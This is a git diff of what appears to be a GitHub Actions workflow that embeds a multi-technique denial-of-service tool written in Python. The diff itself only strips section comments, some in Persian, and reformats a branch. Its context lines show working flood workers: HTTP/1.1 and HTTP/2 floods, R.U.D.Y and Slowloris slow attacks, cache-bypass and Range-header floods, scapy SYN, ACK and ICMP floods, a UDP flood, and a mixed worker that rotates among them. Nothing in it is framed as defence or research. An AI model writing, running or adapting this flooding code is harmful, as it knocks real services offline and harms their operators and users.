@@ -214,7 +214,6 @@ jobs:
           ]
           def get_random_path(): return random.choice(RANDOM_PATHS)
 
-          # ===== کارگر حمله HTTP/1.1 =====
           async def http_worker(url, worker_id):
               connector = aiohttp.TCPConnector(limit=0, force_close=False)
               async with aiohttp.ClientSession(connector=connector) as session:
@@ -235,7 +234,6 @@ jobs:
                           increment('sent'); increment('failed')
                       await asyncio.sleep(0.0001)
 
-          # ===== کارگر HTTP/2 =====
           async def http2_worker(url, worker_id):
               import httpx
               async with httpx.AsyncClient(http2=True, verify=False, timeout=5.0) as client:
@@ -250,7 +248,6 @@ jobs:
                           increment('sent'); increment('failed')
                       await asyncio.sleep(0.0001)
 
-          # ===== R.U.D.Y =====
           async def rudy_worker(url, worker_id):
               parsed = url.replace('https://', '').replace('http://', '').split('/')[0]
               host = parsed.split(':')[0]
@@ -270,7 +267,6 @@ jobs:
                       increment('sent'); increment('failed')
                       await asyncio.sleep(1)
 
-          # ===== Cache Bypass =====
           async def cache_bypass_worker(url, worker_id):
               connector = aiohttp.TCPConnector(limit=0, force_close=False)
               async with aiohttp.ClientSession(connector=connector) as session:
@@ -291,7 +287,6 @@ jobs:
                           increment('sent'); increment('failed')
                       await asyncio.sleep(0.001)
 
-          # ===== Range Header Flood =====
           async def range_worker(url, worker_id):
               connector = aiohttp.TCPConnector(limit=0, force_close=False)
               async with aiohttp.ClientSession(connector=connector) as session:
@@ -310,20 +305,14 @@ jobs:
                           increment('sent'); increment('failed')
                       await asyncio.sleep(0.001)
 
-          # ===== Mixed (همه تکنیک‌ها) =====
           async def mixed_worker(url, worker_id):
               while True:
                   choice = random.randint(1, 10)
-                  if choice <= 3:
-                      await http_worker(url, worker_id)
-                  elif choice <= 5:
-                      await http2_worker(url, worker_id)
-                  elif choice <= 6:
-                      await cache_bypass_worker(url, worker_id)
-                  elif choice <= 7:
-                      await range_worker(url, worker_id)
+                  if choice <= 3: await http_worker(url, worker_id)
+                  elif choice <= 5: await http2_worker(url, worker_id)
+                  elif choice <= 6: await cache_bypass_worker(url, worker_id)
+                  elif choice <= 7: await range_worker(url, worker_id)
                   elif choice <= 8:
-                      # Slowloris
                       try:
                           parsed = url.replace('https://', '').replace('http://', '').split('/')[0]
                           host = parsed.split(':')[0]
@@ -342,7 +331,6 @@ jobs:
                   else:
                       await rudy_worker(url, worker_id)
 
-          # ===== SYN Flood =====
           def syn_worker(ip, port):
               from scapy.all import IP, TCP, send
               while True:
@@ -351,7 +339,6 @@ jobs:
                   send(pkt, verbose=False)
                   increment('sent'); increment('success')
 
-          # ===== ACK Flood =====
           def ack_worker(ip, port):
               from scapy.all import IP, TCP, send
               while True:
@@ -360,14 +347,12 @@ jobs:
                   send(pkt, verbose=False)
                   increment('sent'); increment('success')
 
-          # ===== UDP Flood =====
           def udp_worker(ip, port):
               sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
               while True:
                   sock.sendto(random._urandom(random.randint(1024, 4096)), (ip, port))
                   increment('sent'); increment('success')
 
-          # ===== ICMP Flood =====
           def icmp_worker(ip):
               from scapy.all import IP, ICMP, send
               while True:
@@ -375,7 +360,6 @@ jobs:
                   send(pkt, verbose=False)
                   increment('sent'); increment('success')
 
-          # ===== اجراکننده =====
           def run_async_flood(worker_func, url, workers):
               loop = asyncio.new_event_loop()
               asyncio.set_event_loop(loop)
